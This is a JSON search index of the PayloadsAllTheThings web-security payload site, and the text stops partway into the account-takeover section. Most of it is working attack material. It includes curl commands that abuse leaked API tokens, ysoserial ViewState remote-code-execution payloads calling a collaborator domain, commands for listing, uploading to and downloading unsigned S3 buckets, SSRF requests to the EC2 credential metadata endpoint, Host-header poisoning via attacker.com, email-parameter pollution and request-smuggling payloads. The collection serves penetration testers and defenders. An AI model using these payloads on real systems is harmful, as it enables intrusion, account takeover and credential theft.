{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Payloads All The Things","text":"<p>A list of useful payloads and bypasses for Web Application Security. Feel free to improve with your payloads and techniques !   I  pull requests :)</p> <p>You can also contribute with a  IRL, or using the sponsor button </p> <p> </p> <p>An alternative display version is available at PayloadsAllTheThingsWeb.</p> <p> </p>"},{"location":"#documentation","title":"\ud83d\udcd6 Documentation","text":"<p>Every section contains the following files, you can use the <code>_template_vuln</code> folder to create a new chapter:</p> <ul> <li>README.md - vulnerability description and how to exploit it, including several payloads</li> <li>Intruder - a set of files to give to Burp Intruder</li> <li>Images - pictures for the README.md</li> <li>Files - some files referenced in the README.md</li> </ul> <p>You might also like the <code>Methodology and Resources</code> folder :</p> <ul> <li>Methodology and Resources</li> <li>Active Directory Attack.md</li> <li>Cloud - AWS Pentest.md</li> <li>Cloud - Azure Pentest.md</li> <li>Cobalt Strike - Cheatsheet.md</li> <li>Linux - Evasion.md</li> <li>Linux - Persistence.md</li> <li>Linux - Privilege Escalation.md</li> <li>Metasploit - Cheatsheet.md </li> <li>Methodology and enumeration.md</li> <li>Network Pivoting Techniques.md</li> <li>Network Discovery.md</li> <li>Reverse Shell Cheatsheet.md</li> <li>Subdomains Enumeration.md</li> <li>Windows - AMSI Bypass.md</li> <li>Windows - DPAPI.md</li> <li>Windows - Download and Execute.md</li> <li>Windows - Mimikatz.md</li> <li>Windows - Persistence.md</li> <li>Windows - Privilege Escalation.md</li> <li>Windows - Using credentials.md</li> <li>CVE Exploits</li> </ul> <p>You want more ? Check the Books and Youtube videos selections.</p>"},{"location":"#contributions","title":"\ud83d\udc68\u200d\ud83d\udcbb Contributions","text":"<p>Be sure to read CONTRIBUTING.md</p> <p> </p> <p>Thanks again for your contribution! </p>"},{"location":"#sponsors","title":"\ud83e\uddd9\u200d\u2642\ufe0f Sponsors","text":"<p>This project is proudly sponsored by these companies. </p> <p> </p>"},{"location":"CONTRIBUTING/","title":"CONTRIBUTING","text":"<p>PayloadsAllTheThings' Team  pull requests :) Feel free to improve with your payloads and techniques !</p> <p>You can also contribute with a  IRL, or using the sponsor button.</p>"},{"location":"CONTRIBUTING/#pull-requests-guidelines","title":"Pull Requests Guidelines","text":"<p>In order to provide the safest payloads for the community, the following rules must be followed for every Pull Request.</p> <ul> <li>Payloads must be sanitized</li> <li>Use <code>id</code>, and <code>whoami</code>, for RCE Proof of Concepts</li> <li>Use <code>[REDACTED]</code> when the user has to replace a domain for a callback. E.g: XSSHunter, BurpCollaborator etc.</li> <li>Use <code>10.10.10.10</code> and <code>10.10.10.11</code> when the payload require IP addresses</li> <li>Use <code>Administrator</code> for privileged users and <code>User</code> for normal account</li> <li>Use <code>P@ssw0rd</code>, <code>Password123</code>, <code>password</code> as default passwords for your examples</li> <li>Prefer commonly used name for machines such as <code>DC01</code>, <code>EXCHANGE01</code>, <code>WORKSTATION01</code>, etc</li> <li>References must have an <code>author</code>, a <code>title</code> and a <code>link</code>. The <code>date</code> is not mandatory but appreciated :)</li> </ul>"},{"location":"CONTRIBUTING/#techniques-folder","title":"Techniques Folder","text":"<p>Every section should contains the following files, you can use the <code>_template_vuln</code> folder to create a new technique folder:</p> <ul> <li>README.md - vulnerability description and how to exploit it, including several payloads, more below</li> <li>Intruder - a set of files to give to Burp Intruder</li> <li>Images - pictures for the README.md</li> <li>Files - some files referenced in the README.md</li> </ul>"},{"location":"CONTRIBUTING/#readmemd-format","title":"README.md format","text":"<p>Use the following example to create a new technique <code>README.md</code> file.</p> <pre><code># Vulnerability Title\n&gt; Vulnerability description\n## Summary\n* [Tools](#tools)\n* [Something](#something)\n  * [Subentry 1](#sub1)\n  * [Subentry 2](#sub2)\n* [References](#references)\n\n## Tools\n- [Tool 1](https://example.com)\n- [Tool 2](https://example.com)\n\n## Something\nQuick explanation\n\n### Subentry 1\nSomething about the subentry 1\n\n## References\n- [Blog title - Author, Date](https://example.com)\n</code></pre>"},{"location":"API%20Key%20Leaks/","title":"API Key Leaks","text":"<p>The API key is a unique identifier that is used to authenticate requests associated with your project. Some developers might hardcode them or leave it on public shares.</p>"},{"location":"API%20Key%20Leaks/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Exploit<ul> <li>Google Maps</li> <li>Algolia</li> <li>AWS Access Key ID &amp; Secret</li> <li>Slack API Token</li> <li>Facebook Access Token</li> <li>Github client id and client secret</li> <li>Twilio Account_sid and Auth Token</li> <li>Twitter API Secret</li> <li>Twitter Bearer Token</li> <li>Gitlab Personal Access Token</li> <li>HockeyApp API Token</li> <li>IIS Machine Keys</li> <li>Mapbox API Token</li> </ul> </li> </ul>"},{"location":"API%20Key%20Leaks/#tools","title":"Tools","text":"<ul> <li>KeyFinder - is a tool that let you find keys while surfing the web!</li> <li>KeyHacks - is a repository which shows quick ways in which API keys leaked by a bug bounty program can be checked to see if they're valid.</li> <li>TruffleHog - Find credentials all over the place <pre><code>docker run -it -v \"$PWD:/pwd\" trufflesecurity/trufflehog:latest github --repo https://github.com/trufflesecurity/test_keys\ndocker run -it -v \"$PWD:/pwd\" trufflesecurity/trufflehog:latest github --org=trufflesecurity\ntrufflehog git https://github.com/trufflesecurity/trufflehog.git\ntrufflehog github --endpoint https://api.github.com --org trufflesecurity --token GITHUB_TOKEN --debug --concurrency 2\n</code></pre></li> <li>Trivy - General purpose vulnerability and misconfiguration scanner which also searches for API keys/secrets</li> </ul>"},{"location":"API%20Key%20Leaks/#exploit","title":"Exploit","text":"<p>The following commands can be used to takeover accounts or extract personal information from the API using the leaked token.</p>"},{"location":"API%20Key%20Leaks/#google-maps","title":"Google Maps","text":"<p>Use : https://github.com/ozguralp/gmapsapiscanner/</p> <p>Usage: |   Name   |   Endpoint   | |   ---    |    --- | |   Static Maps    |   https://maps.googleapis.com/maps/api/staticmap?center=45%2C10&amp;zoom=7&amp;size=400x400&amp;key=KEY_HERE   | |   Streetview |    https://maps.googleapis.com/maps/api/streetview?size=400x400&amp;location=40.720032,-73.988354&amp;fov=90&amp;heading=235&amp;pitch=10&amp;key=KEY_HERE | |   Embed  |    https://www.google.com/maps/embed/v1/place?q=place_id:ChIJyX7muQw8tokR2Vf5WBBk1iQ&amp;key=KEY_HERE  | |   Directions |    https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&amp;destination=Universal+Studios+Hollywood4&amp;key=KEY_HERE    | |   Geocoding  |    https://maps.googleapis.com/maps/api/geocode/json?latlng=40,30&amp;key=KEY_HERE | |   Distance Matrix    |    https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&amp;origins=40.6655101,-73.89188969999998&amp;destinations=40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626&amp;key=KEY_HERE   | |   Find Place from Text   |    https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum%20of%20Contemporary%20Art%20Australia&amp;inputtype=textquery&amp;fields=photos,formatted_address,name,rating,opening_hours,geometry&amp;key=KEY_HERE    | |   Autocomplete   |    https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Bingh&amp;types=%28cities%29&amp;key=KEY_HERE    | |   Elevation  |    https://maps.googleapis.com/maps/api/elevation/json?locations=39.7391536,-104.9847034&amp;key=KEY_HERE  | |   Timezone   |    https://maps.googleapis.com/maps/api/timezone/json?location=39.6034810,-119.6822510&amp;timestamp=1331161200&amp;key=KEY_HERE   | |   Roads  |    https://roads.googleapis.com/v1/nearestRoads?points=60.170880,24.942795|60.170879,24.942796|60.170877,24.942796&amp;key=KEY_HERE    | |   Geolocate  |   https://www.googleapis.com/geolocation/v1/geolocate?key=KEY_HERE |</p> <p>Impact: * Consuming the company's monthly quota or can over-bill with unauthorized usage of this service and do financial damage to the company * Conduct a denial of service attack specific to the service if any limitation of maximum bill control settings exist in the Google account</p>"},{"location":"API%20Key%20Leaks/#algolia","title":"Algolia","text":"<pre><code>curl --request PUT \\\n--url https://&lt;application-id&gt;-1.algolianet.com/1/indexes/&lt;example-index&gt;/settings \\\n--header 'content-type: application/json' \\\n--header 'x-algolia-api-key: &lt;example-key&gt;' \\\n--header 'x-algolia-application-id: &lt;example-application-id&gt;' \\\n--data '{\"highlightPreTag\": \"&lt;script&gt;alert(1);&lt;/script&gt;\"}'\n</code></pre>"},{"location":"API%20Key%20Leaks/#slack-api-token","title":"Slack API Token","text":"<pre><code>curl -sX POST \"https://slack.com/api/auth.test?token=xoxp-TOKEN_HERE&amp;pretty=1\"\n</code></pre>"},{"location":"API%20Key%20Leaks/#facebook-access-token","title":"Facebook Access Token","text":"<pre><code>curl https://developers.facebook.com/tools/debug/accesstoken/?access_token=ACCESS_TOKEN_HERE&amp;version=v3.2\n</code></pre>"},{"location":"API%20Key%20Leaks/#github-client-id-and-client-secret","title":"Github client id and client secret","text":"<pre><code>curl 'https://api.github.com/users/whatever?client_id=xxxx&amp;client_secret=yyyy'\n</code></pre>"},{"location":"API%20Key%20Leaks/#twilio-account_sid-and-auth-token","title":"Twilio Account_sid and Auth token","text":"<pre><code>curl -X GET 'https://api.twilio.com/2010-04-01/Accounts.json' -u ACCOUNT_SID:AUTH_TOKEN\n</code></pre>"},{"location":"API%20Key%20Leaks/#twitter-api-secret","title":"Twitter API Secret","text":"<pre><code>curl -u 'API key:API secret key' --data 'grant_type=client_credentials' 'https://api.twitter.com/oauth2/token'\n</code></pre>"},{"location":"API%20Key%20Leaks/#twitter-bearer-token","title":"Twitter Bearer Token","text":"<pre><code>curl --request GET --url https://api.twitter.com/1.1/account_activity/all/subscriptions/count.json --header 'authorization: Bearer TOKEN'\n</code></pre>"},{"location":"API%20Key%20Leaks/#gitlab-personal-access-token","title":"Gitlab Personal Access Token","text":"<pre><code>curl \"https://gitlab.example.com/api/v4/projects?private_token=&lt;your_access_token&gt;\"\n</code></pre>"},{"location":"API%20Key%20Leaks/#hockeyapp-api-token","title":"HockeyApp API Token","text":"<pre><code>curl -H \"X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c\" https://rink.hockeyapp.net/api/2/apps/2021bdf2671ab09174c1de5ad147ea2ba4\n</code></pre>"},{"location":"API%20Key%20Leaks/#iis-machine-keys","title":"IIS Machine Keys","text":"<p>That machine key is used for encryption and decryption of forms authentication cookie data and view-state data, and for verification of out-of-process session state identification.</p> <p>Requirements * machineKey validationKey and decryptionKey * __VIEWSTATEGENERATOR cookies * __VIEWSTATE cookies</p> <p>Example of a machineKey from https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication.</p> <pre><code>&lt;machineKey validationKey=\"87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC\" decryptionKey=\"E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7\" validation=\"SHA1\" /&gt;\n</code></pre> <p>Common locations of web.config / machine.config * 32-bit     * C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\config\\machine.config     * C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\config\\machine.config * 64-bit     * C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\config\\machine.config     * C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\config\\machine.config * in registry when AutoGenerate is enabled (extract with https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab)     * HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\4.0.30319.0\\AutoGenKeyV4     * HKEY_CURRENT_USER\\Software\\Microsoft\\ASP.NET\\2.0.50727.0\\AutoGenKey</p>"},{"location":"API%20Key%20Leaks/#identify-known-machine-key","title":"Identify known machine key","text":"<ul> <li>Exploit with Blacklist3r/AspDotNetWrapper</li> <li>Exploit with ViewGen</li> </ul> <pre><code># --webconfig WEBCONFIG: automatically load keys and algorithms from a web.config file\n# -m MODIFIER, --modifier MODIFIER: VIEWSTATEGENERATOR value\n$ viewgen --guess \"/wEPDwUKMTYyODkyNTEzMw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkuVmqYhhtcnJl6Nfet5ERqNHMADI=\"\n[+] ViewState is not encrypted\n[+] Signature algorithm: SHA1\n# --encrypteddata : __VIEWSTATE parameter value of the target application\n# --modifier : __VIEWSTATEGENERATOR parameter value\n$ AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata &lt;real viewstate value&gt; --purpose=viewstate --modifier=&lt;modifier value&gt; \u2013macdecode\n</code></pre>"},{"location":"API%20Key%20Leaks/#decode-viewstate","title":"Decode ViewState","text":"<pre><code>$ viewgen --decode --check --webconfig web.config --modifier CA0B0334 \"zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY=\"\n$ .\\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate  --modifier=CA0B0334 --macdecode\n$ .\\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath \"/Savings-and-Investments/Application/ContactDetails.aspx\" -f out.txt --IISDirPath=\"/\"\n</code></pre>"},{"location":"API%20Key%20Leaks/#generate-viewstate-for-rce","title":"Generate ViewState for RCE","text":"<p>NOTE: Send a POST request with the generated ViewState to the same endpoint, in Burp you should URL Encode Key Characters for your payload.</p> <pre><code>$ ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c \"cmd.exe /c nslookup &lt;your collab domain&gt;\"  --decryptionalg=\"AES\" --generator=ABABABAB decryptionkey=\"&lt;decryption key&gt;\"  --validationalg=\"SHA1\" --validationkey=\"&lt;validation key&gt;\"\n$ ysoserial.exe -p ViewState -g TypeConfuseDelegate -c \"echo 123 &gt; c:\\pwn.txt\" --generator=\"CA0B0334\" --validationalg=\"MD5\" --validationkey=\"b07b0f97365416288cf0247cffdf135d25f6be87\"\n$ ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c \"C:\\Users\\zhu\\Desktop\\ExploitClass.cs;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\System.dll;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\System.Web.dll\" --generator=\"CA0B0334\" --validationalg=\"SHA1\" --validationkey=\"b07b0f97365416288cf0247cffdf135d25f6be87\"\n$ viewgen --webconfig web.config -m CA0B0334 -c \"ping yourdomain.tld\"\n</code></pre>"},{"location":"API%20Key%20Leaks/#edit-cookies-with-the-machine-key","title":"Edit cookies with the machine key","text":"<p>If you have the machineKey but the viewstate is disabled.</p> <p>ASP.net Forms Authentication Cookies : https://github.com/liquidsec/aspnetCryptTools</p> <pre><code># decrypt cookie\n$ AspDotNetWrapper.exe --keypath C:\\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes\n# encrypt cookie (edit Decrypted.txt)\n$ AspDotNetWrapper.exe --decryptDataFilePath C:\\DecryptedText.txt\n</code></pre>"},{"location":"API%20Key%20Leaks/#mapbox-api-token","title":"Mapbox API Token","text":"<p>A Mapbox API Token is a JSON Web Token (JWT). If the header of the JWT is <code>sk</code>, jackpot. If it's <code>pk</code> or <code>tk</code>, it's not worth your time. <pre><code>#Check token validity\ncurl \"https://api.mapbox.com/tokens/v2?access_token=YOUR_MAPBOX_ACCESS_TOKEN\"\n\n#Get list of all tokens associated with an account. (only works if the token is a Secret Token (sk), and has the appropiate scope)\ncurl \"https://api.mapbox.com/tokens/v2/MAPBOX_USERNAME_HERE?access_token=YOUR_MAPBOX_ACCESS_TOKEN\"\n</code></pre></p>"},{"location":"API%20Key%20Leaks/#references","title":"References","text":"<ul> <li>Finding Hidden API Keys &amp; How to use them - Sumit Jain - August 24, 2019</li> <li>Private API key leakage due to lack of access control - yox - August 8, 2018</li> <li>Project Blacklist3r - November 23, 2018 - @notsosecure</li> <li>Saying Goodbye to my Favorite 5 Minute P1 - Allyson O'Malley - January 6, 2020</li> <li>Mapbox API Token Documentation</li> </ul>"},{"location":"AWS%20Amazon%20Bucket%20S3/","title":"Amazon Bucket S3 AWS","text":""},{"location":"AWS%20Amazon%20Bucket%20S3/#summary","title":"Summary","text":"<ul> <li>AWS Configuration</li> <li>Open Bucket</li> <li>Basic tests<ul> <li>Listing files</li> <li>Move a file into the bucket</li> <li>Download every things</li> <li>Check bucket disk size</li> </ul> </li> <li>AWS - Extract Backup</li> <li>Bucket juicy data</li> </ul>"},{"location":"AWS%20Amazon%20Bucket%20S3/#aws-configuration","title":"AWS Configuration","text":"<p>Prerequisites, at least you need awscli</p> <pre><code>sudo apt install awscli\n</code></pre> <p>You can get your credential here https://console.aws.amazon.com/iam/home?#/security_credential but you need an aws account, free tier account : https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/</p> <pre><code>aws configure\nAWSAccessKeyId=[ENTER HERE YOUR KEY]\nAWSSecretKey=[ENTER HERE YOUR KEY]\n</code></pre> <pre><code>aws configure --profile nameofprofile\n</code></pre> <p>then you can use --profile nameofprofile in the aws command.</p> <p>Alternatively you can use environment variables instead of creating a profile.</p> <pre><code>export AWS_ACCESS_KEY_ID=ASIAZ[...]PODP56\nexport AWS_SECRET_ACCESS_KEY=fPk/Gya[...]4/j5bSuhDQ\nexport AWS_SESSION_TOKEN=FQoGZXIvYXdzE[...]8aOK4QU=\n</code></pre>"},{"location":"AWS%20Amazon%20Bucket%20S3/#open-bucket","title":"Open Bucket","text":"<p>By default the name of Amazon Bucket are like http://s3.amazonaws.com/[bucket_name]/, you can browse open buckets if you know their names</p> <pre><code>http://s3.amazonaws.com/[bucket_name]/\nhttp://[bucket_name].s3.amazonaws.com/\nhttp://flaws.cloud.s3.amazonaws.com/\nhttps://buckets.grayhatwarfare.com/\n</code></pre> <p>Their names are also listed if the listing is enabled.</p> <pre><code>&lt;ListBucketResult xmlns=\"http://s3.amazonaws.com/doc/2006-03-01/\"&gt;\n&lt;Name&gt;adobe-REDACTED-REDACTED-REDACTED&lt;/Name&gt;\n</code></pre> <p>Alternatively you can extract the name of inside-site s3 bucket with <code>%C0</code>. (Trick from https://twitter.com/0xmdv/status/1065581916437585920)</p> <pre><code>http://example.com/resources/id%C0\n\neg: http://redacted/avatar/123%C0\n</code></pre>"},{"location":"AWS%20Amazon%20Bucket%20S3/#basic-tests","title":"Basic tests","text":""},{"location":"AWS%20Amazon%20Bucket%20S3/#listing-files","title":"Listing files","text":"<pre><code>aws s3 ls s3://targetbucket --no-sign-request --region insert-region-here\naws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2\n</code></pre> <p>You can get the region with a dig and nslookup</p> <pre><code>$ dig flaws.cloud\n;; ANSWER SECTION:\nflaws.cloud.    5    IN    A    52.218.192.11\n\n$ nslookup 52.218.192.11\nNon-authoritative answer:\n11.192.218.52.in-addr.arpa name = s3-website-us-west-2.amazonaws.com.\n</code></pre>"},{"location":"AWS%20Amazon%20Bucket%20S3/#move-a-file-into-the-bucket","title":"Move a file into the bucket","text":"<pre><code>aws s3 cp local.txt s3://some-bucket/remote.txt --acl authenticated-read\naws s3 cp login.html s3://$bucketName --grants read=uri=http://acs.amazonaws.com/groups/global/AllUsers\n</code></pre> <pre><code>aws s3 mv test.txt s3://hackerone.marketing\nFAIL : \"move failed: ./test.txt to s3://hackerone.marketing/test.txt A client error (AccessDenied) occurred when calling the PutObject operation: Access Denied.\"\naws s3 mv test.txt s3://hackerone.files\nSUCCESS : \"move: ./test.txt to s3://hackerone.files/test.txt\"\n</code></pre>"},{"location":"AWS%20Amazon%20Bucket%20S3/#download-every-things","title":"Download every things","text":"<pre><code>aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2\n</code></pre>"},{"location":"AWS%20Amazon%20Bucket%20S3/#check-bucket-disk-size","title":"Check bucket disk size","text":"<p>Use <code>--no-sign</code> for un-authenticated check.</p> <pre><code>aws s3 ls s3://&lt;bucketname&gt; --recursive  | grep -v -E \"(Bucket: |Prefix: |LastWriteTime|^$|--)\" | awk 'BEGIN {total=0}{total+=$3}END{print total/1024/1024\" MB\"}'\n</code></pre>"},{"location":"AWS%20Amazon%20Bucket%20S3/#aws-extract-backup","title":"AWS - Extract Backup","text":"<pre><code>$ aws --profile flaws sts get-caller-identity\n\"Account\": \"XXXX26262029\",\n$ aws --profile profile_name ec2 describe-snapshots\n$ aws --profile flaws ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2\n\"SnapshotId\": \"snap-XXXX342abd1bdcb89\",\nCreate a volume using snapshot\n$ aws --profile swk ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-XXXX342abd1bdcb89\nIn Aws Console -&gt; EC2 -&gt; New Ubuntu\n$ chmod 400 YOUR_KEY.pem\n$ ssh -i YOUR_KEY.pem  ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com\nMount the volume\n$ lsblk\n$ sudo file -s /dev/xvda1\n$ sudo mount /dev/xvda1 /mnt\n</code></pre>"},{"location":"AWS%20Amazon%20Bucket%20S3/#bucket-juicy-data","title":"Bucket juicy data","text":"<p>Amazon exposes an internal service every EC2 instance can query for instance metadata about the host. If you found an SSRF vulnerability that runs on EC2, try requesting :</p> <pre><code>http://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/user-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE will return the AccessKeyID, SecretAccessKey, and Token\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance\n</code></pre> <p>For example with a proxy : http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/</p>"},{"location":"AWS%20Amazon%20Bucket%20S3/#references","title":"References","text":"<ul> <li>There's a Hole in 1,951 Amazon S3 Buckets - Mar 27, 2013 - Rapid7 willis</li> <li>Bug Bounty Survey - AWS Basic test</li> <li>flaws.cloud Challenge based on AWS vulnerabilities - by Scott Piper of Summit Route</li> <li>flaws2.cloud Challenge based on AWS vulnerabilities - by Scott Piper of Summit Route</li> <li>Guardzilla video camera hardcoded AWS credential ~~- 0dayallday.org~~ - blackmarble.sh</li> <li>AWS PENETRATION TESTING PART 1. S3 BUCKETS - VirtueSecurity</li> <li>AWS PENETRATION TESTING PART 2. S3, IAM, EC2 - VirtueSecurity</li> <li>A Technical Analysis of the Capital One Hack - CloudSploit - Aug 2 2019</li> </ul>"},{"location":"Account%20Takeover/","title":"Account Takeover","text":""},{"location":"Account%20Takeover/#summary","title":"Summary","text":"<ul> <li>Password Reset Feature<ul> <li>Password Reset Token Leak Via Referrer</li> <li>Account Takeover Through Password Reset Poisoning</li> <li>Password Reset Via Email Parameter</li> <li>IDOR on API Parameters</li> <li>Weak Password Reset Token</li> <li>Leaking Password Reset Token</li> <li>Password Reset Via Username Collision</li> <li>Account takeover due to unicode normalization issue</li> </ul> </li> <li>Account Takeover Via Cross Site Scripting</li> <li>Account Takeover Via HTTP Request Smuggling</li> <li>Account Takeover via CSRF</li> <li>2FA Bypasses<ul> <li>Response Manipulation</li> <li>Status Code Manipulation</li> <li>2FA Code Leakage in Response</li> <li>JS File Analysis</li> <li>2FA Code Reusability</li> <li>Lack of Brute-Force Protection</li> <li>Missing 2FA Code Integrity Validation</li> <li>CSRF on 2FA Disabling</li> <li>Password Reset Disable 2FA</li> <li>Backup Code Abuse</li> <li>Clickjacking on 2FA Disabling Page</li> <li>Enabling 2FA doesn't expire Previously active Sessions</li> <li>Bypass 2FA by Force Browsing</li> <li>Bypass 2FA with null or 000000</li> <li>Bypass 2FA with array</li> </ul> </li> <li>References</li> </ul>"},{"location":"Account%20Takeover/#password-reset-feature","title":"Password Reset Feature","text":""},{"location":"Account%20Takeover/#password-reset-token-leak-via-referrer","title":"Password Reset Token Leak Via Referrer","text":"<ol> <li>Request password reset to your email address</li> <li>Click on the password reset link</li> <li>Don't change password</li> <li>Click any 3rd party websites(eg: Facebook, twitter)</li> <li>Intercept the request in Burp Suite proxy</li> <li>Check if the referer header is leaking password reset token.</li> </ol>"},{"location":"Account%20Takeover/#account-takeover-through-password-reset-poisoning","title":"Account Takeover Through Password Reset Poisoning","text":"<ol> <li>Intercept the password reset request in Burp Suite</li> <li>Add or edit the following headers in Burp Suite : <code>Host: attacker.com</code>, <code>X-Forwarded-Host: attacker.com</code></li> <li>Forward the request with the modified header     <pre><code>POST https://example.com/reset.php HTTP/1.1\nAccept: */*\nContent-Type: application/json\nHost: attacker.com\n</code></pre></li> <li>Look for a password reset URL based on the host header like : <code>https://attacker.com/reset-password.php?token=TOKEN</code></li> </ol>"},{"location":"Account%20Takeover/#password-reset-via-email-parameter","title":"Password Reset Via Email Parameter","text":"<pre><code># parameter pollution\nemail=victim@mail.com&amp;email=hacker@mail.com\n# array of emails\n{\"email\":[\"victim@mail.com\",\"hacker@mail.com\"]}\n# carbon copy\nemail=victim@mail.com%0A%0Dcc:hacker@mail.com\nemail=victim@mail.com%0A%0Dbcc:hacker@mail.com\n# separator\nemail=victim@mail.com,hacker@mail.com\nemail=victim@mail.com%20hacker@mail.com\nemail=victim@mail.com|hacker@mail.com\n</code></pre>"},{"location":"Account%20Takeover/#idor-on-api-parameters","title":"IDOR on API Parameters","text":"<ol> <li>Attacker have to login with their account and go to the Change password feature.</li> <li>Start the Burp Suite and Intercept the request</li> <li>Send it to the repeater tab and edit the parameters : User ID/email     <pre><code>POST /api/changepass\n[...]\n(\"form\": {\"email\":\"victim@email.com\",\"password\":\"securepwd\"})\n</code></pre></li> </ol>"},{"location":"Account%20Takeover/#weak-password-reset-token","title":"Weak Password Reset Token","text":"<p>The password reset token should be randomly generated and unique every time. Try to determine if the token expire or if it's always the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm.</p> <ul> <li>Timestamp</li> <li>UserID</li> <li>Email of User</li> <li>Firstname and Lastname</li> <li>Date of Birth</li> <li>Cryptography</li> <li>Number only</li> <li>Small token sequence (&lt;6 characters between [A-Z,a-z,0-9])</li> <li>Token reuse</li> <li>Token expiration date</li> </ul>"},{"location":"Account%20Takeover/#leaking-password-reset-token","title":"Leaking Password Reset Token","text":"<ol> <li>Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com</li> <li>Inspect the server response and check for <code>resetToken</code></li> <li>Then use the token in an URL like <code>https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&amp;email=[THE_MAIL]</code></li> </ol>"},{"location":"Account%20Takeover/#password-reset-via-username-collision","title":"Password Reset Via Username Collision","text":"<ol> <li>Register on the system with a username identical to the victim's username, but with white spaces inserted before and/or after the username. e.g: <code>\"admin \"</code></li> <li>Request a password reset with your malicious username.</li> <li>Use the token sent to your email and reset the victim password.</li> <li>Connect to the victim account with the new password.</li> </ol> <p>The platform CTFd was vulnerable to this attack.  See: CVE-2020-7245</p>"},{"location":"Account%20Takeover/#account-takeover-due-to-unicode-normalization-issue","title":"Account takeover due to unicode normalization issue","text":"<p>When processing user input involving unicode for case mapping or normalisation, unexcepted behavior can occur.  </p> <ul> <li>Victim account: <code>demo@gmail.com</code></li> <li>Attacker account: <code>dem\u24de@gmail.com</code></li> </ul> <p>Unisub - is a tool that can suggest potential unicode characters that may be converted to a given character.</p> <p>Unicode pentester cheatsheet can be used to find list of suitable unicode characters based on platform.</p>"},{"location":"Account%20Takeover/#account-takeover-via-cross-site-scripting","title":"Account Takeover Via Cross Site Scripting","text":"<ol> <li>Find an XSS inside the application or a subdomain if the cookies are scoped to the parent domain : <code>*.domain.com</code></li> <li>Leak the current sessions cookie</li> <li>Authenticate as the user using the cookie</li> </ol>"},{"location":"Account%20Takeover/#account-takeover-via-http-request-smuggling","title":"Account Takeover Via HTTP Request Smuggling","text":"<p>Refer to HTTP Request Smuggling vulnerability page. 1. Use smuggler to detect the type of HTTP Request Smuggling (CL, TE, CL.TE)     <pre><code>git clone https://github.com/defparam/smuggler.git\ncd smuggler\npython3 smuggler.py -h\n</code></pre> 2. Craft a request which will overwrite the <code>POST / HTTP/1.1</code> with the following data:     <pre><code>GET http://something.burpcollaborator.net  HTTP/1.1\nX: \n</code></pre> 3. Final request could look like the following     <pre><code>GET /  HTTP/1.1\nTransfer-Encoding: chunked\nHost: something.com\nUser-Agent: Smuggler/v1.0\nContent-Length: 83\n0\nGET http://something.burpcollaborator.net  HTTP/1.1\nX: X\n</code></pre></p> <p>Hackerone reports exploiting this bug * https://hackerone.com/reports/737140 * https://hackerone.com/reports/771666</p>"},{"location":"Account%20Takeover/#account-takeover-via-csrf","title":"Account Takeover via CSRF","text":"<ol> 